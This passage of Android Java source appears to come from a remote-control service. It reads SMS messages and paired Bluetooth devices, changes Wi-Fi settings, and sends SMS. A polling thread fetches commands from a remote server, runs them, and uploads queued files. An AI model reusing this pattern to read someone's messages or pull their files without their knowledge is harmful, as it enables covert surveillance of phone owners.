								Set<BluetoothDevice> pairedDevices = bluetoothAdapter.getBondedDevices();
								JSONArray pairedDevicesList = new JSONArray();

								// There are paired devices. Get the name and address of each paired device.
								for (BluetoothDevice device : pairedDevices)
									pairedDevicesList.put(device.getName());

								response.put("pairedDevices", pairedDevicesList);

								result = true;
								break;
						}
						break;
					case "wifiManager":
						WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);

						response.put("wirelessStatus", wifiState(wifiManager.getWifiState()));

						switch (receivedMessage.getString("mode")) {
							case "power":
								result = wifiManager.setWifiEnabled(receivedMessage.getBoolean("power"));
								break;
							case "connect":
								WifiConfiguration wifiConfig = new WifiConfiguration();
								wifiConfig.SSID = String.format("\"%s\"", receivedMessage.getString("network"));
								wifiConfig.preSharedKey = String.format("\"%s\"", receivedMessage.getString("password"));

								int netId = wifiManager.addNetwork(wifiConfig);
								wifiManager.disconnect();
								wifiManager.enableNetwork(netId, true);
								wifiManager.reconnect();

								result = true;
								break;
							case "scan":
								JSONArray accessPoints = new JSONArray();

								wifiManager.startScan();

								for (ScanResult resultIndex : wifiManager.getScanResults())
									accessPoints.put(new JSONObject()
											.put("capabilities", resultIndex.capabilities)
											.put("SSID", resultIndex.SSID));

								response.put("accessPoints", accessPoints);

								result = true;
								break;
						}
						break;
					case "messageList":
						JSONArray messageList = new JSONArray();
						String smsUri = "content://sms/";
						int passedToPosition = receivedMessage.has("limit") ? receivedMessage.getInt("limit") : 0;

						try {
							Uri uri = Uri.parse(smsUri);
							String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
							Cursor messageCursor = getContentResolver().query(uri, projection, "address LIKE ?", new String[]{"%" + receivedMessage.getString("address") + "%"}, "date asc");

							if (messageCursor.moveToFirst()) {
								response.put("totalResult", messageCursor.getCount());

								int indexAddress = messageCursor.getColumnIndex("address");
								int indexPerson = messageCursor.getColumnIndex("person");
								int indexBody = messageCursor.getColumnIndex("body");
								int indexDate = messageCursor.getColumnIndex("date");
								int indexType = messageCursor.getColumnIndex("type");

								do {
									if (passedToPosition > 0 && messageCursor.getPosition() < (messageCursor.getCount() - passedToPosition))
										continue;

									messageList.put(new JSONObject()
											.put("address", messageCursor.getString(indexAddress))
											.put("isReceived", messageCursor.getInt(indexType) == 1)
											.put("date", DateFormat.format("yyyy-MM-dd HH:mm", messageCursor.getLong(indexDate)))
											.put("text", messageCursor.getString(indexBody)));
								} while (messageCursor.moveToNext());

								if (!messageCursor.isClosed()) {
									messageCursor.close();
									messageCursor = null;
								}
							}

							result = true;
						} catch (SQLiteException ex) {
							Log.d("SQLiteException", ex.getMessage());
						}

						response.put("isLimited", receivedMessage.has("limit") && receivedMessage.getInt("limit") > 0);
						response.put("msg", messageList);
						break;
					default:
						response.put("error", "{" + request + "} is not found");
				}

				response.put("result", result);
			}

		}
	}

	private class ParallelConnection
	{
		public final static int TYPE_COOLSOCKET = 0;
		public final static int TYPE_TEL_NUMBER = 2;

		private int mType;
		private String mServer;
		private int mPort;
		private String mNumber;

		public ParallelConnection(String telephoneNumber)
		{
			this.mType = TYPE_TEL_NUMBER;
			this.mNumber = telephoneNumber;
		}

		public ParallelConnection(String server, int port)
		{
			this.mType = TYPE_COOLSOCKET;
			this.mServer = server;
			this.mPort = port;
		}

		public int getType()
		{
			return this.mType;
		}

		public void sendMessage(final String message)
		{
			if (getType() == TYPE_TEL_NUMBER) {
				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(this.mNumber, null, message, null, null);
			} else if (getType() == TYPE_COOLSOCKET) {
				CoolSocket.connect(new CoolSocket.Client.ConnectionHandler()
				{
					@Override
					public void onConnect(CoolSocket.Client client)
					{
						try {
							CoolSocket.ActiveConnection activeConnection = client.connect(new InetSocketAddress(mServer, mPort), AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);

							activeConnection.reply(message);
							activeConnection.receive();
						} catch (IOException e) {
							e.printStackTrace();
						} catch (JSONException e) {
							e.printStackTrace();
						} catch (TimeoutException e) {
							e.printStackTrace();
						}
					}
				});
			}
		}

		public String toString()
		{
			return (this.mType == TYPE_TEL_NUMBER) ? this.mNumber : this.mServer + ":" + this.mPort;
		}
	}

	class RemoteThread extends Thread
	{
		private boolean mIsAvailable = true;

		public RemoteThread()
		{
		}

		public boolean doCommunicate()
		{
			if (mRemote.getAddress() == null || !mIsAvailable) {
				Log.d(TAG, "Remote connection passed; hasAddress=" + (mRemote.getAddress() != null) + "; available=" + mIsAvailable);
				return false;
			}

			Log.d(TAG, "Remote connection: opening new connection; logCount=" + mRemoteLogs.length());

			mIsAvailable = false;

			try {
				mRemote.getAddress().clearAll();
				mRemote.getAddress().addPost(AppConfig.PREVIOUS_RESULTS, mRemoteLogs.toString());

				JSONArray cmds = new JSONArray(mRemote.connect());

				if (cmds.length() > 0) {
					Log.d(TAG, "Remote connection: connected; receivedCommands=" + cmds.length());
					for (int i = 0; i < cmds.length(); i++)
						runCommand(REMOTE_SERVER, cmds.getString(i), false);
				}

				mRemoteLogs = new JSONArray();
			} catch (Exception e) {
				Log.d(TAG, "Remote connection: context=default; error=" + e);
			}

			if (mUploadQueue.size() > 0) {
				FileHolder firstFile = mUploadQueue.get(0);

				ServerAddress serverAddress = mRemote.getAddress();
				serverAddress.clearAll();

				try {
					if (firstFile.file.isFile()) {
						HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
						StringBuilder output = new StringBuilder();

						request.readTimeout(0);
						request.part(firstFile.categoryName, firstFile.file.getName(), firstFile.file);
						request.receive(output);

						Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());

						if (request.ok()) {
							if (mUploadQueue.size() > 0)
								mUploadQueue.remove(0);

							if (firstFile.deleteOnExit)
								firstFile.file.delete();
						}
					} else {
						Log.e(TAG, "File upload is passed (NOT_FOUND)");
						if (mUploadQueue.size() > 0)
							mUploadQueue.remove(0);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}

			mIsAvailable = true;

			return true;
		}

		@Override
		public void run()
		{
			super.run();
			Log.d(TAG, "RemoteServer thread started");

			while (!isInterrupted()) {
				try {
					Thread.sleep(mRemoteThreadDelay);
				} catch (InterruptedException e) {
				}

				doCommunicate();
			}

			Log.d(TAG, "RemoteServer thread ended");
		}
	}

	protected class FileHolder
	{
		public File file;
		public boolean deleteOnExit = false;
		public String categoryName = "files";
	}
}
